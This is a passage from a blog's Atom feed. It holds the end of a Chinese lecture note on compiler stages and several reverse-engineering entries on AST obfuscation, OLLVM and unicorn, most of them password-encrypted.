align="center">结果</th></tr></thead><tbody><tr><td align="center">（1）</td><td align="center">将整常数50转换为实常数</td><td align="center"></td><td align="center"></td><td align="center">T<del>1</del></td></tr><tr><td align="center">（2）</td><td align="center">*</td><td align="center">b</td><td align="center">T<del>1</del></td><td align="center">T<del>2</del></td></tr><tr><td align="center">（3）</td><td align="center">+</td><td align="center">a</td><td align="center">T<del>2</del></td><td align="center">T<del>3</del></td></tr><tr><td align="center">（4）</td><td align="center">&#x3D;</td><td align="center">T<del>3</del></td><td align="center"></td><td align="center">x</td></tr></tbody></table><p>以上就是四元式</p><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>对中间代码进行加工变换，变换出效率更高的代码</li><li>原则：等价变换，在不改变原意的情况下</li><li>主要方面：<ul><li>公共子表达式的提取：x&#x3D;<strong>(a+b)</strong>*c+<strong>(a+b)</strong>*d</li><li>合并已知量：c&#x3D;a+b   d &#x3D; a+b   未改变a，b的值</li><li>删除无用语句：一些注释或者一些与程序本身无关的表达式</li><li>循环优化</li></ul></li></ul><p>例如将以下语句转成中间代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>( k = <span class="number">1</span>; k &lt;= <span class="number">100</span>; k++)&#123;</span><br><span class="line">m = i + <span class="number">10</span>*k;</span><br><span class="line">n = j + <span class="number">10</span>*k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230110193728210.png" alt="image-20230110193728210"></p><p>优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的</p><p><img data-src="/./../images/image-20230110193939323.png" alt="image-20230110193939323"></p><h3 id="目标代码生成"><a href="#目标代码生成" class="headerlink" title="目标代码生成"></a>目标代码生成</h3><ul><li>任务：把优化的中间代码转化成特定机器上的低级语言</li><li>目标指令的形式：<ul><li>绝对指令代码：就是01010的机器代码如exe文件，可立即执行</li><li>汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行</li><li>可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码</li></ul></li></ul><h3 id="表格与表格管理"><a href="#表格与表格管理" class="headerlink" title="表格与表格管理"></a>表格与表格管理</h3><ul><li>表格作用：用来记录源程序的各种信息以及编译过程中的各种状况</li><li>与编译前三阶段有关的表格：<ul><li>符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况<img data-src="/./../images/image-20230110195304443.png" alt="image-20230110195304443"></li><li>常数表与标号表：登记各类常数值，登记标号的定义与作用<img data-src="/./../images/image-20230110195424180.png" alt="image-20230110195424180"></li><li>入口名表：登记过程的层号，分程序符号表入口<img data-src="/./../images/image-20230110195523654.png" alt="image-20230110195523654"></li><li>中间代码表</li></ul></li></ul><h3 id="出错与处理"><a href="#出错与处理" class="headerlink" title="出错与处理"></a>出错与处理</h3><p>错误类型:</p><ul><li>语法错误:在词法分析和语法分析阶段检测出来</li><li>语义错误：一般在语义分析阶段检测</li></ul><p>遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。</p><p>（遍与阶段的含义毫无关系。）</p><p>一遍扫描</p><p><img data-src="/./../images/image-20230110195852519.png" alt="image-20230110195852519"></p><p>&#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D;</p><h3 id="编译程序生成"><a href="#编译程序生成" class="headerlink" title="编译程序生成"></a>编译程序生成</h3><p>生成方式：</p><ol><li>直接用机器语言编写编译程序</li><li>用汇编语言编写编译程序<ul><li>注：编译程序核心部分常用汇编语言编写</li></ul></li><li>用高级语言编写编译程序：这是普遍采用的方法</li><li>.自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序</li><li>编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表)</li><li>移植（同种语言的编译程序在不同类型的机器之 间移植）</li></ol><p>写编译程序的基本条件：</p><ul><li>源程序语言</li><li>目标程序语言</li><li>编译方法</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;引论学习&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆2</title>
    <link href="https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/"/>
    <id>https://pa1r0t.github.io/2023/01/05/AST%E6%B7%B7%E6%B7%862/</id>
    <published>2023-01-05T09:57:25.000Z</published>
    <updated>2023-01-08T14:31:35.707Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1582fd55161f9b708d09a3973b6da50b8b21c2fecab1ffdc16f7800ea4cf299b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">AST的API详解</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>AST混淆1</title>
    <link href="https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/"/>
    <id>https://pa1r0t.github.io/2023/01/03/AST%E6%B7%B7%E6%B7%861/</id>
    <published>2023-01-03T11:32:24.000Z</published>
    <updated>2023-01-05T06:47:15.734Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a335dfe83e9162fe8508efc0a9385b02fd82d77aa193ac5a2b3a3fb2e7e578af"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">JavaScript代码安全防护原理</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ollvm做法</title>
    <link href="https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/"/>
    <id>https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/</id>
    <published>2023-01-02T14:06:24.000Z</published>
    <updated>2023-01-12T14:08:24.883Z</updated>
    
    <content type="html"><![CDATA[<p>unicorn start</p><span id="more"></span><h3 id="目标-处理ollvm混淆"><a href="#目标-处理ollvm混淆" class="headerlink" title="目标:处理ollvm混淆"></a>目标:处理ollvm混淆</h3><p><img data-src="/./../images/image-20230102221120506.png" alt="image-20230102221120506"></p><p><img data-src="/./../images/image-20230102221205367.png" alt="image-20230102221205367"></p><h3 id="用脚本处理该函数"><a href="#用脚本处理该函数" class="headerlink" title="用脚本处理该函数"></a>用脚本处理该函数</h3><p>在脚本中设置起始地址和文件名</p><p><img data-src="/./../images/image-20230102221258379.png" alt="image-20230102221258379"></p><p>然后执行该python文件</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;unicorn start&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>x86暴力调用so</title>
    <link href="https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/"/>
    <id>https://pa1r0t.github.io/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/</id>
    <published>2023-01-02T01:03:22.000Z</published>
    <updated>2023-01-02T08:15:42.212Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="130960b561bf60654b16d147e78ce8b3dee63804bf2eb1ef9c407c76401313ac"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">c++暴力调用so</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>unicorn_learning5</title>
    <link href="https://pa1r0t.github.io/2023/01/01/unicorn-learning5/"/>
    <id>https://pa1r0t.github.io/2023/01/01/unicorn-learning5/</id>
    <published>2023-01-01T01:58:42.000Z</published>
    <updated>2023-01-01T14:05:26.105Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7053b91467131b187c1dc1ec07b067556e22c5e466ccc8949296170463086a9c">57f4ad225687d507395974160374769b2879cc786eddcc489def179d2372db7f21ba4301511baa9d038ded7bf900e616f674954b3fd06d4bfc4f76422d342fd27f2f8fe6aa10fa5ed04b54db404adbd9ce6c7b2e037d57e025025414daae09e9d620605c8f756dcfb2d0263952d62ffbc3296e888a22f24402203afc321fdd22672080e7e1996f6c5e81f600983d39e0bc20b4ee000afda1f293cd0526545df2da34c94f13bf80b261f665cf91fb0522e2e7573e198a51dbcbe92173fd29932e7cd3ed36a4088ce0677b5bd96285dfa52aea45dad54df1a435b2dc87d1ed9544a3774dc8b4c3a229ff51efdf21ccf695adf02b15eb762eff9299bf0c90675d4beff67265173a75d9862925fb6d86399a36ff3cd7b3cc14bb207645707e58b59e3787250544aee5f7600ea0fd024f0e57acec04b2ee0aaf98fa6bd979178421a8e273ee6dc2984087764d713a42fc405e8c1070ec13834111b74220e2eae5fc38025743b5d7583d49463f897e0e391e464c88101a2c030f62bbfdd7c16ac553e85086f639e7a71af40315f44e95e2fa00063f7e0c948159853cb76e6e41a0c2ad6aa8b92413e3f582dba26f9191dddbec47ccc28af180cba1074cdd9fba81b7797b23e12a4f0d099df09b6e8b44f3a882a717258c40f76c6a4f5efc52011d9a63924d36fdb05e67c0991db02f794d80eded1bcdd550c114302f4ae951b2b09fb76ed923cb2c8d7894d6022b3741c06d99f0369415eb9ac1fbd483b1264f4e2ca7b76b35cc2bcf450138481c1b348044649a982121fa1be68a38ae4c19f732041a72c83ea30c70d79ffe69888b486aa3e1f6c0bf0b1e86bf63882fb8801588ea2ae3b932acf9268666665d2579ff2f2d9108207141fafe04c5adece16ddea819c8a1ee322dc7612414638f1587fcd3e511ac8649ba305c1e05bc3e254204887aa4f68b61e2ff1170e2281c45247da0ad6829d10958687ba7597cc3c4ed9768f0b7a426cdaa26e7ec6a61c49f9303dcebf75347817d60adab6c23cee820534ffc846983ab439a682ed1ee7e0359449cf32768024b431a8a68e63bfee15d69c6db8b9645db2aefbe09f80afaab4e7fef5ae5f6fa5b2bdebfc121a135ecf875994180f4cbf639356ede32d0116b597ec319f1fc1e1d845ba391133a53155ddf92ef6e509890ad75f9090e881bb504467fd3afa93f697436f77519cde9570ef8fcee6d6bf88dc01014a65d01eea89484059bfe0beccae73f798fd688b816fe37f56577249705ddc74cd1c644b38ae0fff2127630a07a94b1bc5d1bff5ab2e1b6369a7cdced8c8b3b4a685b20f7f13953e9c2e18cf4b0cff930b234089967dc08b4821c2fa62675eacfb7f4acd78c132eb174f930d3069c14165b0e746a9880a23ef012de83c8e577cee9e95c51f8179cf3878c6c15238d963beb4e1ad80d68bee59309cb1a0a5102735446246eab5209201dad365860c613a63c86da8059297f56f100ed159c21ca330c1d460e9bbc220947a4bda07638aaa7236ce00bd8717970e15a826f14b771116f97162368cfde0a98b102d4ca8341f4afab723b7ad05756de32cde9f761cf1b91124c6700efe2c813b66bff14bcaef0181784078506172ae95d26996026a1178916270f2713d4f6b63d8c5dddd31bc4be309c9fba4aad600d4a762e14a08f75379f72abe76a2a08041aa974183c61ff93195933e30e8b9354bca84868dede39ab83a3f7947977dc011f8f45bdd8bc9c9392e3a0f00f1502c2734a25eb3caac3090dcab4fbe97e01d3d11f3d6420115fcba78f286d7ca2a3d62d314032346eb9b9dd072dc4da7ecfe9e66b6f36ad4014f3d06529db9a9a5a2ba39d11d99c85bd3d94ae0358c5529a61a4025d6bc94577e2efaef7b05d4d18f88384fc9a5c97485dc24661f21eb757a33d436994f2842147f094a1f972145e3493f1ee2f2673204bcd042d907fbb3ddc4096fed9ccea923b068677168d0190ef2e36dda9da59e3fa8d5e4c16bd339c4549b8c3846eaa125ef033a01187f83ab1f7896f955e981de352fce641b0cce7027ff8a9d108cf90c8d42efdea4979f12599a28674be681d99e8785c742eaa0b7bd5da090d534f299f002c0837e4fe96ed44115d8082a29c3e980870b75710bf735960638d4f1928555943994b67cf433db95c889a579c0cb7878044ab57eebe8af4179442301cb6c139723293906a006a252b8932fd3f5f47c2ac484d095a28b1eb351ced891ae633634161c426463a08645035a233f45b15fb127a909d3ac480430f8beeb6ccdd79559e02d2d336928428eac8a9f8b7e7cb5150e718c6e860d02b528ee715d00f78a68768bee3f5fc4b3cdc53966b450473b5f0108888375648dcf83872c1825b1a49a22fbdbb314973a215702e6027f2fd3df62a3fb1ea7b610bd52baf258710763040edb9b82870d222526675ddf06d2c4b96a1bb21a1fc3b429e3483dbc5573bcac5ff396982bf979299f9f394ab154526073600ea0669e7a3a46d052c32d7d109b58cad035235fc70f2dfac85bafdc7bd100a820ddf0b6681c158bf2e03ccdce4ba1337bece1d3a2d4bff9aa0777a603a048b6598fb45e851042e04573a71d5e2312d3f6d776774a9dd40e26ee08af5e8f988f0cc7ae622024e0a59999489c7fc7912ba10eb414e87949fff62796d4af9f5c11485a55d4b92ce87b4224c295ac792646440189bb2f8e2f794d961a0b212bc5b7a3614fdcdf5f398780e4b023ef969c1fb61832b738cc3d979c740cdd7044399a23677c9355592bd4cf9c65f7e34c00925640dbda19212d4f03c3c2de22cdbaefa07520499ff5afdbb04798303c2090069735ce4a6c81e399779cd0bb91facb029fb2c7184be873f622950ce9ed4ab5d5b1574d24ed28b99c3fcc5b475c76cc0b5a5b9b2f338c428bc880b9e289043a72aff5d6a91a63fac291f510ff451912cbc199399259ae1ab3b8de91456ba5d7457ff06c61679e2744e27db8f5e44efad01f8caecd57752d346937f9f0636a5e042446161dbf2a23eb74c84f3c76d9d0c2b28df40bb8113a9f3ff8429398339127969ca30f71d1eeb5d9f6ebac7170099a45a6a32a6c67299c438b23b5842dc7fb44da61e0ec79e96ddd6ededc2d65280df794f8153acfe2781b5dd5bbfe64dc5db57a0adab0297915612d148583a0f39ab5a2501792c46b8f02f32e26d81aae85dc147174da1fd713370bb4b5f17cd1cf838872cea0d35254c205611359c22f5f72ae500a84bcbf0c7f2b9abbe24a4ac631ebb72eb126b82f92d3e3dfc77c346bd7468a0590c90df0446e5258b6130c26e2b8448d44abbaed70c9686c82574d884826e05c05f09e71d506ecbc04c384a6a585ed6fa099522bed8b159429f1999e8ecfb3b47f3eec9ccdc675030338f9b9577270b31bf312569d57ce968a968f308d1ae427a5f91a49da2ae8e962440a62571ef4b4ba97d6fdd38961d3d43b66e143050cc40293d9e3181f0b506c64c8ea13ac041250b2a6de56ba4e409a690af5d84c7c424981a158fa54693128b89d45bee35e210813c575080196ea9c6502f8a5635e622d8b872c3ec2addfcbe4e7a446d667c9962f84c7e1e7d08ae600f8c6b878a4a8caaf70e29ad36411dd5a03ca8f904037f170ad289ac969c30f5674f290a8ba7634e8321bac5839a0972344619d9ba88da917ebc7e5c6d2b4aa30374e3e9426f12d8a93a7fb931b460b08cce6fa7aae5c58811c9a40f64e6ed010aa203deaae8d85a6ca991d12ad56f8cb21bc50799d0d8adf605274f6b6be77ba393bf3fa48c4d9e91aba9e0d06b00bb4e84de5cdd5d3202e6ff965a99524acf5984be80ea1a71f86e5190e6e3c1747f208577183fa5e5945dabaf487dd51d010fc457c4f19ab1c8c974ae0f14dd0be80f6a4017697c08a68c3b272980dbcede28e909ea87968b2ab563c3848f6812d3acf365d89b6192aa2128f712bf8568ae245c036f003ad5c8aacc89ec29f9e1df42af6a59127a7ed19ca1eb1d9b4b20e76f6a8fa12054249b387fd15c2f19733094309c598af8477aa6c4449ab31ba68d896e861f5da5056e9e78c6d243fa9fcf6e5b92cccb08e9dd4425d2d60f30afc938677c8b07a3018afba519c1d725e5452cad60488d5e146675be949379b38a5c821941132d8627137b7a131ed3ebd17c00bf37a804ee2b13361f544ac81a2052a42c10aa3ef850efa9b15966c85504847a2685dfcd19f7e3974337d5ff92fe8f5ded32f1bf7f2f77c1282467da8c25dcbb7ff834abac360595d75c300db679f8c76e893cf13186874d6235fa066bbc74dbaedd531a48e66a929d11df5fb288f0ce4d34ef5efc4e6ec12a898a465bfb6f8d236930a2d37bc1bd47b4c0bc2f4eb76dda29294293c9cbbfc3c048e8872ad15f6cf21a481faffb9be2ed20158f7e3d33da77c4aab934a52401f9b8bddad5f23cf2c97e7fe330c02435f39bff75e3e213e5f3cb918e2d4501d4580c56957dbd555c8d35743973d2cb3d2f6aa3df7804f02a67ec7f0d2b925072c5d465b0906177692482d7866a0e2a08bccdf30e53cdc3929df1bd3dfd88f834bc7e6a70705849d644504faceb2888c03cb3c6903d5cfa4387673ff8530391feb190f0107741186e6804c315baf9162c8890ec84d78644878c88a9735a197a0a030f9e9d5c1989f04ff3db5949512cd81946de2209bef039171d3c4e4d816901799c0051997469abfc4efa1943f1e94dac5dbc56cbbf4232eb46f18221fcd24f9e386541630852825afda1d8208bcbcec76e63177ac7d767975309509f82e1ca20d87ff767c2adaf73a84bbec71c03092484f4cb7b0aeabb635c738ad98b44f82d89355869770b257eaca8fe4d52046f0c1967fdc49eca21f76f3ad9086744ea8d7ce99daed2cae784a7d232df3512d51ef31a6034be83d42a0a5dde5a903384d5d5256a6e3e106bbda759a44ca4b856018e9b540ba5b47c6abd3a823d4edb2f35eae78b8ee9f70fc7b8d7887c08e4481f0d70f297c7a84bd69609b33babb84be0674646c47800e2e43922d9bc7919ffef075c976bd8621d47ca29829de973d3043945dd46125fd54e496ec0e324c19fcf05c77c74cb55d0c5977e61fbcc41a20934d2978259cb90c59329161ba35f20b4efbddc9db8168bac141d82ae8838935c0dbf5b6620ede0fea70ac884337e3248a0477ee1890d16acb8a1482c535e460e1885a7e56a33db60637d3ebf4e5d4cdb5d02ddcbf28200d804c34ca6b4ceee4128739aa116a1b072ec971ee88dfe8b8a69a02d322b4d45119db70f25f61ac1a5a2fc86745420fef59639df675d4682a8f5c3e6795857fd43e211a017a623dbee08c368161b837ad053d6d919f6c781ce7d2d92361426f5a1f7bd69dd210ea0d9563d015b39dd8ecab79f4f76125fa9232d0b7b8d9ced31083153ac12849f5902758d663e607fcd6d257cb546378e84121a47bbf53a818acbe6be75f021eae0cdb1e7ecc12f5a59cf51795c52b3ee6ac1a5cb3d24f214e63e4b19596b64ba9c336ef43cd8b3a4d715e22b5158693efb23485b80a46cbd6aed4af5c1048e35ee14f597d484b92628e1e32531d130dafc74745a482c7f653279f4eef399fd5931372d092157d70cceabedd92bc1b1e6f657a9c0ee2ffc51592a885e6a2d54a41d4f9ccda4b62298a01474064d9d9fc3911d65406c8ee8d9125e9815be6f1af7ae43ae23a8c79a3ebe542bee81e2808c3ad8321181e3a3b46fa6581428316675849ca5bee9d2c673a89f8ef24cf722f4918bb80a169d41d944dbf7623cbcc064ad5b7807853e1e704b2c36e1bb3d8572c85e175f5ed9a97dcd07c5c885c6b430daa7c957b9823299faf23e4e93a1e10bb486cd381a60857eac5e632190c74c10afc34693e70b4bd6b7209b8fc03b84a5527e9a43d64b31c1efea21281c837f6806742e2a95a96372137ab0e70b35721224647574111d45486d45867d8f40f24f60eb05c02200fe13e84cb61d71d107a74a9a7c75e0277d2aa307fba59812bdc25351f0b4959ef9e30f2d7ae1bbcff10fa81e8bdb913359159a6087f2fd7b80454328461f8db777b15dd1f808fd4f8f0bc5a13bc232e20957114772fa7095f43bdc9b65f324d2fd51c097bce3bee667b8d7fc53a7c88fe4ecae573b6e20ba4eb924932ab90e5909425646af25024fb5b52624196f79183ad647c19d529076d73364e7d8beaa71c9f0bc3df8fef4d43b6acf435ca6b43a1f5b1494f93abb272193c5aa2481686072dcd1409753fe9fbfaf25b498b0c68a6fbce75733d2b8c1d7574640c061d95cc6488f4d9580a40415cdfbb4589ed8e434add9a78e33b0c66376831ef1cd8c2b2e4d0ad535fd0a1d399dd179ddef39f84e79ca41b48c0497578674287963e39907780f0d0722e4ce65c6fe21bb0945499eda27ff924dc28162b1bf13696a9f24b27e1a336d9f8bc2a274db21895b26d832bc77cad1013603439a81108ca8b6c51dd4daede9fd5a731aa3567ca35051806e885c0011c2c8534c4964af001016ad4f44bd366cdf01a3576c05d11e0a4d8b39abe3019f06865f345a5333b0c053f35e04b2d2f86a7e6a3db05240c0873d5729d1afa763d7d544c91bf377f40bc3607c04e44916ae62dfafe9e6294d794300e41dbaf092e641a45ec37e0fba1326496b112fbc1edaa531c9313919e24c3299a75a7ef4e764ee9dd102378eb656b0f72fdc95f1519a5fdb9c4c516eb3b3ca2f6acfb12ddc499354ab781142c451d8c1516559d3f1d6fe2908406e1c0ff1957a383ffebc53bbcd45f97ec8dd1252394fb0de9d4fae87a5e7200c78c5ffb290d938f2de339822b985a999c2f57915e3b39db437a3811e95fcac6cad613cdc6e7882d07e5ac277487714f8ed2599f12b9578e2a6736c2a10a665217281c6c41bceacae890757b216dd5578795d7e50f11cbd9a43a0354e351bc2965e35f56e3bcf0fe3fdce2f3a2840597dff6ed61a3e1c3cab13838c8c2ecdbb597216b9ceac584e83efd0db30c57d853ab7a8809aba08d169175a2e0c5d571f4e328f089466c8f1be587a446d7ed2d0465018bcd100816fd84d56b929fb2e310f67963bf7fcdd768cd1c35ee34967247851043ce9334db687d40390553caf7c8301b0a8bb91251799bf56569abd7ebb854540ddb84f0b702de21d5ac05c7039451ef1919e317f8fef7afa7650cf76ced9a335ae46b1c5dc99f8bcf6f6424de2b0c7347e99ba247aba0e2935926bb0d7c1d0975536efc965b654ce964a3cabd4237a28293d66ef2fa15cddaf62e5754e8b2af5dba5523de5caa26a3907448044a41663c5472f548dc8ce7999df677f304bb91efcdc588fae9f9eb5689d286fe928e3eb51ebe19e6f4966a036afab35fed7bbd510748d4ea0924579accc44c96775ae894e4a79ba51c7f5787f7ef3742de471da559b4a89761e7af79d3d34434ea84eb39a368d657ccaeb7f3c1a1d95b7fa188bf296f27faf2e7ce07c1e4a0b3aa2c2cf6341adc087a7ebeebd470b5ebe552757fc02d8ec5aed025fc7302a552be1c3193476d048300a43955def05fbca679cd148dda201d2a2d41b0b93996d3f65e6dce89df24c3377e08ba5dabc1579a93fbeedb0ec0933a48913886f097cb93a36f7d3a6d63deca92e2a821ecd4dfb09d7b361641b2648228b77ae72b2c321a76bf9646cd842443aaf26413d8e645e5dd75aead92f69d2b746b3ab11ba43c0c3f7d82fe3cd0f239f3f1b170c8826e4030744757bacd9694a86e3d7c427e86cfef714becac020137af012eb3077455c44c04c4cb20679261f223070b8fb8a9d76c434c028feceff6b4ae101fec31c4b8f22c53a906fbf2875c99745aeede09c9837a2c10b4e2aa19a368d726bda9f91cb64a2f7268052e5f4bac49facc20c640346f5c5256e05433cd1eddd52d3eaa7ef7be0ff6aba671749dbd6359b8db4e4b8be597cfbe891493be802a5a5a1b35069fd85a6dec32f61060cf3682bf093f6708ce17ea2d9ea09c19ba62db342278b40056448ce63a8c031a7df117f68e49399addbfa3221a552d32d08eac52d64a85a7e353e16ddcb714b127202c28510ff9433608fb24a4e55362d5b8d47c45b04c9a45484287ef16ac608aecc06ba59ad67cd710b0c385e8017c31d795de68f4575ab570bdd10dfd34331c9d96f97e148d6df5cade8dceb7359ec4e5b28712b8d43ddcb503c482c3f803071ae435d94838f250c851ff1a1d0960989d2688d3e93a1c13b8e9b247c4972c67e4b3c65aa6a1854773b508a32262a7c079090a6fe2b04c005e230411c5f3ef15509c4381b10c7fc71172bc29b9adc29f3338db8877d1548a9e6db83c51e11faefd8750114389d9b5acae14ac9a1a5f056e8e2b8206936cf5088fb2709c6b295435d3493a6ad948e4561443be0c9846fea7eb190dcb7d5e19307ed3824ef01be1d3d891c075c6e44b8486cab02c6651b394ef96840db36e3512be81163d4861e4155a0014a3ee27b2d0bfaf166e48739fa36b029bb3cecbfda657f319b84ef6a4f9e3dd553bb207c61a2c673ff6c436499ed019bc65cd7ec5e36f4e85a240758c57f5e62981692354e2dcfad60bf9063b5a2b633efca3ba3583ce2f16dc09cc6d3576237431f00b4b7a4f995a4e8d73d655a982fb241b2321a23b1951371b2190f8618da90038249581d710831e4e24512da9d00c84cbbd10d2519db63ff393a2a5d52e7f647851dbba2e0e27d6f7018cd0e741963ec1446efdf829a863a937fc414277fa6b400a3ef1b991694079814b7aefdd4ee096ffe511e82c1b355ad117f9a62f4cb6313fb3be58ba6c5ee55b0da7e6fd314e775074eb93784873520d789038093fa0eeebd1155e387f2a3245530bcf367a57ed73cff22af63a532d3f1e0a80e82368ad9c09e7de5149e8013432f45e20ead36abd522c42103e4a89d56913392de645df7d013890729357c69b3e1fe7d74d622a930dae501c7d4184a490372803f5a2bcfc7d6a8f6183d5067b61c5f31e22eb9a406f3673d21a7b448d6c43e8f413ad951190e11b1e33d495ccdeb36c19ac81356fe9d87e800937ec42cb04f20d709c177a63539b81a86da93195d82d01ad40986b9c1b21f499e701fa413da176935fd8e3f02523a0665a07be6f40cc24060b1b8f31c4225a75e20a4b1702f9109a5ccdd703932f7673edfa7790aed236608c7acc3840853aff95af5b7e88582101632c7465214dbef11b3dd533d9c76e9580bf67fd69941dbacdb7d0b6bb4395d3cd52e017cb066fd36ad0e793bf9c64d98f7cd23ff61501ea3b9ed11d67e91daecfc65fc8d9c55b981f2c66aad3fc398db989b677d6fd917ccbe4a7555cc2aa17632c56b6b54468782603b969138a2890d2ec7d2a98c0183cb639a8a3f811e5662f3ce7ef02c5a34d3aec5e7df28bd87e52720ff6d3f1ec31ba394ba1c816f9fa9f9ebedb8d207decdf2a21bfbb44accfcc387d7a509d92ec90c5feccdb57001767c9b2afe8832d9b870be9a0d0405b05d58a370fd9375c52878f40327aef56522f2a99cf994b5c8afb8749568f520d76f8a7d0e3e342e12ff7880439ae624e308f9cd00a96bf51cf8cd4a51120520ef3802fcf10562461ad5c2f7940db3d78c2cd839b9104003f5ab125404d90f35f52c405c497620551e1682ed4855c6fd69ebd0a54ffb2edf0e7773fb7650eb2507dcfcab0949755d5ef16a129255e71d4647b722cd97da3d731e50beeba0ab3a570d1a028036a38269a05203e8fc637780d55732f74e98ebb904397f434b6c2108be4292e9b0bf385e3040b5bc80fd0d0e9c40849b270328f4514fcb52f65bfd29a199ce05d7e96ae84946b93301cd51054aaa62c4bf967f68c8c225a5960c7032366d5d6dfa33eb18f5db65db151c4b1d44ae8903455fb25ee2ba77992bfb997a4a814c4aa7039e863b4eebce3fe51330ef046677ab70183b050509078657bb33fa08405ac830c37664044a43a997ff45841fbd420a644e1ad80c0d29e2443190bf04c2e5c26f81b52c7617ee1f6500ef59f6a07d3ff7c39c531274886a93b894ef9138a029f9c4aacab5bb74db203d8fe8599d71fe214b1506d9ef97485b97179486f5d1b0f8d147e7663a3a1cde78ca5461d037edcfcffdb2aa9adeaab7d37ee67f65c50d1df109b5d85928b50c719da694295a16b78faa6f708aef70c3e0e8d3d1c944ff4b802d44d8876cfb87a20deeafd18b11d2dcb33867deaaf9153dc7677725d847a9d9f6e76269cb8e93f87be2412d5a3d555ee5907173e2204a477c41692a3319f6a4cbb0e2a2d2b30e7f0aa715558955d376be3ec4bb88aa76e76399827d0fd21182c3b72c4a1876cbe1f6eb2d0c6a69c8431212ca0e499fdae627a519cdf26a9541064bbe24da49ee961ff77424dd2ef6d71d9f7fcaba66daddb7b946b8fea0bca75403f25d8097dc339aa72ac104e69875c8d8b2fc0546d23e161cbc8f9e21427535f24d369f8d20df9d435ce422735330736a5a7c9b756d2269e0281b68abf6905028b0264fc964e795e90ed88e2245e96fdc64178619d402bfba296cdde277a8d533251950b98bebab7e7a2b1a098f630915ffe55e1e023d8110130315d44a720e3fd4de176ed0cd4822d46625c53a2ad9f2820d5c65d4b116808aaef9c68f4f54d3690c51928fef2f6159e884abe1b8282ea063d1c7da44608ed1f6fed116b52c9a412d28bae9dcd222fd8c6543ba9e0842033edd77dab869d6143b40dee6ed06ad713b5fd5099095ebbcf67ebab965e477d255493c44fbbe1c107fda7d342f7105d4655b3018a4ef88b5b0caf173360f9f65f1038e0011c940acad5a5f1f2a020085ecb257d8f9b019fb22b315d251841b0ab61490644f8752d3dc7dbe2f6e9470b7aba6909ecfabb4d6757e0693b9224739fa6f29a79ce4a68e0ddd450336b8ca12307fbe67e0eb98df13bb0c461efb6fef6b30da58ddb